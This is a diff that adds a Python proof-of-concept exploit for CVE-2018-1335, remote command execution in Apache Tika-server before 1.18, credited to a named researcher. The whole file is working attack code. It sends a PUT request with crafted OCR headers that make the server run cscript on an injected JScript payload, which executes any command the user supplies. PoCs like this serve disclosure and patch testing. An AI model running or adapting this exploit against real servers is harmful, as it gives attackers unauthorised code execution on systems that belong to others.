@@ -1,0 +1,39 @@
+######################################################################################################
+#Description: This is a PoC for remote command execution in Apache Tika-server.                      #
+#Versions Affected: Tika-server versions < 1.18                                                      #   
+#Researcher: David Yesland Twitter: @Daveysec                                                        #
+#Blog Link: https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/ #                                                                   # 
+#NIST CVE Link: https://nvd.nist.gov/vuln/detail/CVE-2018-1335                                       #
+######################################################################################################
+
+import sys
+import requests
+
+if len(sys.argv) < 4:
+	print "Usage: python CVE-2018-1335.py <host> <port> <command>"
+	print "Example: python CVE-2018-1335.py localhost 9998 calc.exe"
+else:
+	host = sys.argv[1]
+	port = sys.argv[2]
+	cmd = sys.argv[3]
+
+	url = host+":"+str(port)+"/meta"
+
+	headers = {"X-Tika-OCRTesseractPath": "\"cscript\"", 
+		"X-Tika-OCRLanguage": "//E:Jscript", 
+		"Expect": "100-continue", 
+		"Content-type": "image/jp2", 
+		"Connection": "close"}
+
+	jscript='''var oShell = WScript.CreateObject("WScript.Shell");
+	var oExec = oShell.Exec('cmd /c {}');
+	'''.format(cmd)
+
+	try:
+		requests.put("https://"+url, headers=headers, data=jscript, verify=False)
+	
+	except:
+		try:
+			requests.put("http://"+url, headers=headers, data=jscript)
+		except:
+			print "Something went wrong.\nUsage: python CVE-2018-1335.py <host> <port> <command>"
